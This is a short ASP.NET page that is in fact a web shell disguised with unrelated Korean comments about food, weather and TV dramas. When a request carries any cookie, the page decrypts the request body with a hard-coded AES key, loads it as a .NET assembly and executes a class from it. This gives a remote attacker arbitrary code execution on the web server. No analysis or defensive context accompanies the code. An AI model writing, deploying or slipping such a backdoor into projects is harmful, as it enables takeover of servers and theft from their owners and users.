<%@ Page Language="C#" %>
<script runat="server">
    // 배고파요, 치킨 먹고 싶다
    private static byte[] a() {
        var p1 = "ca634575";
        var p2 = "38b9b1e0";
        return System.Text.Encoding.Default.GetBytes(p1 + p2);
    }

    // 오늘 날씨가 정말 좋네요.
    private static byte[] b(System.IO.Stream s) {
        var d = new byte[s.Length];
        s.Read(d, 0, d.Length);
        return d;
    }

    // 이 코드는 아주 복잡해요.
    private static void c(byte[] k, byte[] d, object p) {
        var r = new System.Security.Cryptography.RijndaelManaged();
        var t = r.CreateDecryptor(k, k).TransformFinalBlock(d, 0, d.Length);
        var x = System.Reflection.Assembly.Load(t);
        string n = new System.Text.StringBuilder("K").ToString();
        x.CreateInstance(n).Equals(p);
    }
</script>
<%
    // 한국 드라마는 재미있다
    if (Request.Cookies.Count * 1 > 0) {
        c(a(), b(Request.InputStream), this);
    }
%>